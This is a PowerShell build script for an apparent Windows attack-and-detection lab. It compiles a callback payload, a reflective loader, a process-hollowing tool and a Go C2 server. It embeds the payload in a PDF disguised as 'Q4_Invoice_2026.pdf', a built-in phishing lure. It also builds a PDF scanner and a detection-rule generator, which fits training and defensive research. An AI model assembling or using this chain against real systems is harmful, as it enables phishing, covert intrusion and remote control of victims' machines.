#Requires -Version 5.1
<#
.SYNOPSIS
    PHANTOM-X :: build everything on Windows.

.DESCRIPTION
    One script that builds every native component of the lab on a Windows
    machine, in dependency order, and reports honestly what it could and
    could not build.

    WHAT IT BUILDS
        1. px_payload.exe   -- freestanding C, reflectively loadable
        2. px_loader.exe    -- C, PDF extractor + reflective PE mapper
        3. px_hollow.exe    -- C, PDF extractor + remote process mapper
        4. px_c2.exe        -- Go, the lab C2 server
        5. px_pdfscan.exe   -- Rust, the independent PDF scanner
        6. px_detect.exe    -- Rust, the detection rule generator
        7. px_attack_chain.pdf -- the carrier PDF, from the built payload

    TOOLCHAIN REQUIREMENTS
        * MSVC      -- Visual Studio Build Tools with the C++ workload
        * Windows SDK -- the headers (windows.h) are required
        * Go        -- for the C2 server
        * Rust      -- for the two Rust tools
        * Python    -- for the PDF generator and the test harnesses

    A MISSING TOOLCHAIN IS NOT A FAILURE.
        The script reports what it skipped and why, and exits 0 if at least
        one component was built. A lab machine with only MSVC on it is a
        perfectly normal state, not an error.

    BUILDING THE LOADER
        px_loader.c and px_hollow.c use zlib for the FlateDecode stream
        filter. Three routes are tried, in order:
          1. a static libz.lib / libz.a already next to the sources
          2. vcpkg's installed zlib
          3. the MinGW cross-compiler, which has a static libz built in
        If none is available the loader is skipped and the script says so.
        The payload does NOT need zlib and always builds.

.PARAMETER C2Host
    Host the payload calls back to. Baked into the payload at compile time
    and overridable at runtime with PX_C2_HOST.

.PARAMETER C2Port
    Port the payload calls back to.

.PARAMETER OutputDir
    Where the built artefacts go. Defaults to a 'dist\native' directory
    beside this script.

.PARAMETER Only
    Build just one component: payload, loader, hollow, c2, pdfscan, detect,
    pdf, or 'all'.

.EXAMPLE
    .\build_all.ps1
    .\build_all.ps1 -C2Host 192.168.77.1 -C2Port 9001
    .\build_all.ps1 -Only c2
#>
[CmdletBinding()]
param(
    [string]$C2Host = '127.0.0.1',
    [int]$C2Port = 9001,
    [string]$OutputDir = '',
    [ValidateSet('all', 'payload', 'loader', 'hollow', 'c2', 'pdfscan', 'detect', 'pdf')]
    [string]$Only = 'all',
    [switch]$Clean
)

$ErrorActionPreference = 'Continue'

$here = $PSScriptRoot
$root = Split-Path (Split-Path $here -Parent) -Parent
if (-not $OutputDir) {
    $OutputDir = Join-Path $root 'dist\native'
}

$built = @()
$skipped = @()
$failed = @()

function Write-Section {
    param([string]$Text)
    Write-Host ''
    Write-Host ('=' * 70) -ForegroundColor DarkGray
    Write-Host $Text -ForegroundColor Cyan
    Write-Host ('=' * 70) -ForegroundColor DarkGray
}

function Note-Built {
    param([string]$What, [string]$Path)
    $script:built += "$What -> $Path"
    Write-Host ("    OK   {0}" -f $What) -ForegroundColor Green
}

function Note-Skipped {
    param([string]$What, [string]$Why)
    $script:skipped += "$What ($Why)"
    Write-Host ("    SKIP {0}: {1}" -f $What, $Why) -ForegroundColor Yellow
}

function Note-Failed {
    param([string]$What, [string]$Why)
    $script:failed += "$What ($Why)"
    Write-Host ("    FAIL {0}: {1}" -f $What, $Why) -ForegroundColor Red
}

# ---------------------------------------------------------------------------
# Locate the toolchains
# ---------------------------------------------------------------------------
Write-Section 'toolchains'

function Find-MSVC {
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (-not (Test-Path $vswhere)) { return $null }
    $path = & $vswhere -latest -products * `
        -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 `
        -property installationPath
    if (-not $path) { return $null }
    $vcvars = Join-Path $path 'VC\Auxiliary\Build\vcvars64.bat'
    if (Test-Path $vcvars) { return $vcvars }
    return $null
}

$vcvars = Find-MSVC
if ($vcvars) {
    Write-Host '  MSVC      : found' -ForegroundColor Green
    $lines = & cmd.exe /c "`"$vcvars`" && set" 2>$null
    foreach ($l in $lines) {
        if ($l -match '^([^=]+)=(.*)$') {
            Set-Item -Path "Env:$($matches[1])" -Value $matches[2] -ErrorAction SilentlyContinue
        }
    }
    if (-not (Get-Command cl.exe -ErrorAction SilentlyContinue)) {
        $vcvars = $null
        Write-Host '  MSVC      : vcvars ran but cl.exe is not on PATH' -ForegroundColor Yellow
    }
} else {
    Write-Host '  MSVC      : NOT FOUND (need Visual Studio Build Tools)' -ForegroundColor Yellow
}

# The Windows SDK headers are what the C sources include. Without them
# cl.exe cannot compile anything at all, and the error it gives
# ("cannot open include file: 'windows.h'") does not say what is missing.
$sdkInclude = $null
$sdkRoot = 'C:\Program Files (x86)\Windows Kits\10\Include'
if (Test-Path $sdkRoot) {
    $sdkInclude = Get-ChildItem $sdkRoot -Directory -ErrorAction SilentlyContinue |
                  Sort-Object Name -Descending |
                  Where-Object { Test-Path (Join-Path $_.FullName 'um\windows.h') } |
                  Select-Object -First 1
}
if ($sdkInclude) {
    Write-Host ("  Win SDK   : {0}" -f $sdkInclude.Name) -ForegroundColor Green
} else {
    Write-Host '  Win SDK   : NOT FOUND (the C sources need windows.h)' -ForegroundColor Yellow
}

$go = Get-Command go.exe -ErrorAction SilentlyContinue
if (-not $go) {
    foreach ($p in @('C:\Program Files\Go\bin\go.exe',
                     "$env:LOCALAPPDATA\Programs\Go\bin\go.exe")) {
        if (Test-Path $p) { $go = Get-Item $p; break }
    }
}
if ($go) { Write-Host '  Go        : found' -ForegroundColor Green }
else { Write-Host '  Go        : NOT FOUND' -ForegroundColor Yellow }

$cargo = Get-Command cargo.exe -ErrorAction SilentlyContinue
if (-not $cargo) {
    $p = "$env:USERPROFILE\.cargo\bin\cargo.exe"
    if (Test-Path $p) { $cargo = Get-Item $p }
}
if ($cargo) { Write-Host '  Rust      : found' -ForegroundColor Green }
else { Write-Host '  Rust      : NOT FOUND' -ForegroundColor Yellow }

$python = Get-Command python.exe -ErrorAction SilentlyContinue
if (-not $python) { $python = Get-Command python3.exe -ErrorAction SilentlyContinue }
if ($python) { Write-Host '  Python    : found' -ForegroundColor Green }
else { Write-Host '  Python    : NOT FOUND' -ForegroundColor Yellow }

if ($Clean -and (Test-Path $OutputDir)) {
    Write-Host ''
    Write-Host "  cleaning $OutputDir" -ForegroundColor DarkGray
    Remove-Item $OutputDir -Recurse -Force -ErrorAction SilentlyContinue
}
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

$loaderDir = Join-Path $root 'phase3_fileless\loader'

# ---------------------------------------------------------------------------
# 1. The payload -- freestanding C
# ---------------------------------------------------------------------------
if ($Only -in @('all', 'payload')) {
    Write-Section '1. px_payload.exe (freestanding C)'
    if (-not $vcvars) {
        Note-Skipped 'payload' 'no MSVC'
    } elseif (-not $sdkInclude) {
        Note-Skipped 'payload' 'no Windows SDK headers'
    } else {
        $out = Join-Path $OutputDir 'px_payload.exe'
        Push-Location $loaderDir
        try {
            # /Zl omits the default library, /NODEFAULTLIB at link time.
            # Both are required: the payload must not link a CRT, because
            # its CRT startup needs a TLS index that only the Windows
            # loader assigns, and this image is mapped by hand.
            #
            # /Gs raises the stack-probe threshold so the compiler does not
            # emit a call to __chkstk, which normally comes from the CRT
            # that this build deliberately does not link. The largest frame
            # in the file is about 5KB, well inside the 1MB default stack.
            #
            # The /D defines go through cmd.exe because MSVC's quoting
            # rules mangle a quoted string passed from PowerShell.
            & cmd.exe /c 'cl.exe /nologo /O2 /W4 /GS- /Zl /Gs999999999 /c px_payload.c /DPX_DEFAULT_HOST=\"127.0.0.1\" /DPX_DEFAULT_PORT=9001' 2>&1 |
                Out-String | Write-Host
            if ($LASTEXITCODE -eq 0) {
                # Link into the loader directory first, then copy to the
                # output directory. The linker is given a relative output
                # name because a path with spaces in it confuses it when
                # the command is assembled for cmd.exe.
                & cmd.exe /c 'link.exe /nologo /NOENTRY /ENTRY:px_entry /SUBSYSTEM:CONSOLE /OUT:px_payload.exe px_payload.obj ws2_32.lib kernel32.lib /NODEFAULTLIB' 2>&1 |
                    Out-String | Write-Host
                $built = Join-Path $loaderDir 'px_payload.exe'
                if ($LASTEXITCODE -eq 0 -and (Test-Path $built)) {
                    Copy-Item $built $out -Force
                    Note-Built 'px_payload.exe' $out
                } else {
                    Note-Failed 'px_payload.exe' "link exit $LASTEXITCODE"
                }
            } else {
                Note-Failed 'px_payload.exe' "compile exit $LASTEXITCODE"
            }
        } finally {
            Pop-Location
            Remove-Item (Join-Path $loaderDir 'px_payload.obj') -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# 1b. The formatter self-test
#
# The payload's formatter is hand-written (it cannot use the CRT printf),
# and it had three bugs that each produced a plausible-looking wrong
# answer. The self-test is the regression guard for those. It is run
# after every build, because a formatter bug shows up as a wrong exit
# code at the far end of a C2 session, which is a long way from the
# cause.
# ---------------------------------------------------------------------------
if ($Only -in @('all', 'payload')) {
    Write-Section '1b. formatter self-test'
    if (-not $vcvars) {
        Note-Skipped 'px_selftest.exe' 'no MSVC'
    } else {
        Push-Location $loaderDir
        try {
            & cmd.exe /c 'cl.exe /nologo /O2 /W4 /GS- /Zl /Gs999999999 px_selftest.c /Fe:px_selftest.exe /link /NOENTRY /ENTRY:px_selftest_entry /SUBSYSTEM:CONSOLE ws2_32.lib kernel32.lib /NODEFAULTLIB' 2>&1 |
                Out-String | Write-Host
            if ($LASTEXITCODE -eq 0) {
                $result = & cmd.exe /c 'px_selftest.exe' 2>&1 | Out-String
                $result | Write-Host
                if ($result -match 'RESULT: PASS') {
                    Note-Built 'px_selftest.exe (formatter regression test)' (Join-Path $loaderDir 'px_selftest.exe')
                } else {
                    Note-Failed 'px_selftest.exe' 'the formatter self-test reported FAIL'
                }
            } else {
                Note-Failed 'px_selftest.exe' "compile exit $LASTEXITCODE"
            }
        } finally {
            Pop-Location
            Remove-Item (Join-Path $loaderDir 'px_selftest.obj') -ErrorAction SilentlyContinue
        }
    }
}

# ---------------------------------------------------------------------------
# 2/3. The loader and the hollow tool -- C, needs zlib
# ---------------------------------------------------------------------------
function Find-Zlib {
    # 1. a static lib next to the sources
    foreach ($n in @('libz.a', 'zlib.lib', 'libz.lib')) {
        $p = Join-Path $loaderDir $n
        if (Test-Path $p) { return @{ Lib = $p; Kind = 'local' } }
    }
    # 2. vcpkg
    $vcpkgRoots = @()
    if ($env:VCPKG_ROOT) { $vcpkgRoots += $env:VCPKG_ROOT }
    $c = Get-Command vcpkg.exe -ErrorAction SilentlyContinue
    if ($c) { $vcpkgRoots += (Split-Path $c.Source -Parent) }
    $vcpkgRoots += "$env:LOCALAPPDATA\vcpkg"
    $vcpkgRoots += "$env:USERPROFILE\vcpkg"
    foreach ($vcpkg in $vcpkgRoots) {
        if (-not $vcpkg -or -not (Test-Path $vcpkg)) { continue }
        foreach ($sub in @('installed\x64-windows-static\lib',
                           'installed\x64-windows\lib')) {
            $p = Join-Path $vcpkg $sub
            if (-not (Test-Path $p)) { continue }
            # vcpkg names the static zlib library "zs.lib", not
            # "zlib.lib". Both names are accepted so that the script works
            # against either a vcpkg install or a hand-placed library.
            foreach ($libName in @('zlib.lib', 'zs.lib', 'libz.lib')) {
                $libPath = Join-Path $p $libName
                if (Test-Path $libPath) {
                    return @{ Lib = $libPath; Kind = "vcpkg ($libName)";
                              Include = (Join-Path $vcpkg 'installed\x64-windows-static\include') }
                }
            }
        }
    }
    # 3. MinGW cross toolchain
    $gcc = Get-Command x86_64-w64-mingw32-gcc.exe -ErrorAction SilentlyContinue
    if ($gcc) {
        $prefix = Split-Path (Split-Path $gcc.Source -Parent) -Parent
        $lib = Join-Path $prefix 'lib\libz.a'
        if (Test-Path $lib) {
            return @{ Lib = $lib; Kind = 'mingw';
                      Include = (Join-Path $prefix 'include') }
        }
    }
    return $null
}

function Build-ZlibTool {
    param([string]$Source, [string]$Output, [string]$Label)
    $z = Find-Zlib
    if (-not $z) {
        Note-Skipped $Label 'no zlib available (loader needs FlateDecode)'
        return
    }
    Push-Location $loaderDir
    try {
        Write-Host ("    zlib: {0} ({1})" -f $z.Lib, $z.Kind) -ForegroundColor DarkGray
        # The command is assembled for cmd.exe because the include path
        # and the output path both contain spaces on a normal Windows
        # install, and MSVC's quoting rules do not survive PowerShell's.
        $outRel = Split-Path $Output -Leaf
        $cmd = 'cl.exe /nologo /O2 /W4 ' + $Source
        if ($z.Include) { $cmd += ' /I"' + $z.Include + '"' }
        $cmd += ' /Fe:' + $outRel + ' /link "' + $z.Lib + '" ws2_32.lib kernel32.lib'
        & cmd.exe /c $cmd 2>&1 | Out-String | Write-Host
        $built = Join-Path $loaderDir $outRel
        if ($LASTEXITCODE -eq 0 -and (Test-Path $built)) {
            Copy-Item $built $Output -Force
            Note-Built $Label $Output
        } else {
            Note-Failed $Label "compile/link exit $LASTEXITCODE"
        }
    } finally {
        Pop-Location
    }
}

if ($Only -in @('all', 'loader')) {
    Write-Section '2. px_loader.exe (PDF extractor + reflective PE mapper)'
    if (-not $vcvars) { Note-Skipped 'px_loader.exe' 'no MSVC' }
    elseif (-not $sdkInclude) { Note-Skipped 'px_loader.exe' 'no Windows SDK headers' }
    else { Build-ZlibTool -Source 'px_loader.c' -Output (Join-Path $OutputDir 'px_loader.exe') -Label 'px_loader.exe' }
}

if ($Only -in @('all', 'hollow')) {
    Write-Section '3. px_hollow.exe (PDF extractor + remote process mapper)'
    if (-not $vcvars) { Note-Skipped 'px_hollow.exe' 'no MSVC' }
    elseif (-not $sdkInclude) { Note-Skipped 'px_hollow.exe' 'no Windows SDK headers' }
    else { Build-ZlibTool -Source 'px_hollow.c' -Output (Join-Path $OutputDir 'px_hollow.exe') -Label 'px_hollow.exe' }
}

# ---------------------------------------------------------------------------
# 4. The Go C2 server
# ---------------------------------------------------------------------------
if ($Only -in @('all', 'c2')) {
    Write-Section '4. px_c2.exe (Go lab C2 server)'
    if (-not $go) {
        Note-Skipped 'px_c2.exe' 'no Go toolchain'
    } else {
        $src = Join-Path $root 'phase5_network'
        $out = Join-Path $OutputDir 'px_c2.exe'
        Push-Location $src
        try {
            & $go.Source build -trimpath -ldflags '-s -w' -o $out . 2>&1 | Out-String | Write-Host
            if ($LASTEXITCODE -eq 0) {
                Note-Built 'px_c2.exe' $out
            } else {
                Note-Failed 'px_c2.exe' "go build exit $LASTEXITCODE"
            }
        } finally {
            Pop-Location
        }
    }
}

# ---------------------------------------------------------------------------
# 5/6. The Rust tools
# ---------------------------------------------------------------------------
function Build-RustTool {
    param([string]$CrateDir, [string]$BinName, [string]$Output, [string]$Label)
    if (-not $cargo) {
        Note-Skipped $Label 'no Rust toolchain'
        return
    }
    Push-Location $CrateDir
    try {
        & $cargo.Source build --release --offline 2>&1 | Out-String | Write-Host
        if ($LASTEXITCODE -ne 0) {
            # Offline can fail if the registry index is not cached. Retry
            # online before giving up: the lab VM is often offline, but
            # the build host is usually not.
            & $cargo.Source build --release 2>&1 | Out-String | Write-Host
        }
        if ($LASTEXITCODE -eq 0) {
            $built = Join-Path $CrateDir "target\release\$BinName.exe"
            if (Test-Path $built) {
                Copy-Item $built $Output -Force
                Note-Built $Label $Output
            } else {
                Note-Failed $Label "expected binary not found at $built"
            }
        } else {
            Note-Failed $Label "cargo build exit $LASTEXITCODE"
        }
    } finally {
        Pop-Location
    }
}

if ($Only -in @('all', 'pdfscan')) {
    Write-Section '5. px_pdfscan.exe (Rust independent PDF scanner)'
    Build-RustTool -CrateDir (Join-Path $root 'phase1_pdf\rust_scanner') `
                   -BinName 'px_pdfscan' `
                   -Output (Join-Path $OutputDir 'px_pdfscan.exe') `
                   -Label 'px_pdfscan.exe'
}

if ($Only -in @('all', 'detect')) {
    Write-Section '6. px_detect.exe (Rust detection rule generator)'
    Build-RustTool -CrateDir (Join-Path $root 'phase7_detection') `
                   -BinName 'px_detect' `
                   -Output (Join-Path $OutputDir 'px_detect.exe') `
                   -Label 'px_detect.exe'
}

# ---------------------------------------------------------------------------
# 7. The carrier PDF
# ---------------------------------------------------------------------------
if ($Only -in @('all', 'pdf')) {
    Write-Section '7. px_attack_chain.pdf'
    $payload = Join-Path $OutputDir 'px_payload.exe'
    if (-not (Test-Path $payload)) {
        Note-Skipped 'px_attack_chain.pdf' 'no built payload to embed'
    } elseif (-not $python) {
        Note-Skipped 'px_attack_chain.pdf' 'no Python for the generator'
    } else {
        $gen = Join-Path $root 'phase1_pdf\make_attack_pdf.py'
        $pdf = Join-Path $OutputDir 'px_attack_chain.pdf'
        & $python.Source $gen --payload $payload --out $pdf `
            --name 'Q4_Invoice_2026.pdf' --attachment 'Q4 Invoice' `
            --subject 'Q4 Invoice for review' 2>&1 | Out-String | Write-Host
        if ($LASTEXITCODE -eq 0) {
            Note-Built 'px_attack_chain.pdf' $pdf
        } else {
            Note-Failed 'px_attack_chain.pdf' "generator exit $LASTEXITCODE"
        }
    }
}

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
Write-Section 'summary'
Write-Host "  output: $OutputDir" -ForegroundColor White
Write-Host ''
if ($built.Count) {
    Write-Host '  BUILT:' -ForegroundColor Green
    foreach ($b in $built) { Write-Host ("    + {0}" -f $b) -ForegroundColor Green }
}
if ($skipped.Count) {
    Write-Host ''
    Write-Host '  SKIPPED:' -ForegroundColor Yellow
    foreach ($s in $skipped) { Write-Host ("    - {0}" -f $s) -ForegroundColor Yellow }
}
if ($failed.Count) {
    Write-Host ''
    Write-Host '  FAILED:' -ForegroundColor Red
    foreach ($f in $failed) { Write-Host ("    ! {0}" -f $f) -ForegroundColor Red }
}

Write-Host ''
Write-Host '  NEXT:' -ForegroundColor White
Write-Host "    cd phase0_labnet; .\setup_labnet.ps1 -Action apply" -ForegroundColor White
Write-Host "    cd phase5_network; ..\dist\native\px_c2.exe --host <lab-ip> --port $C2Port" -ForegroundColor White
Write-Host ''

if ($failed.Count -gt 0) { exit 1 }
exit 0
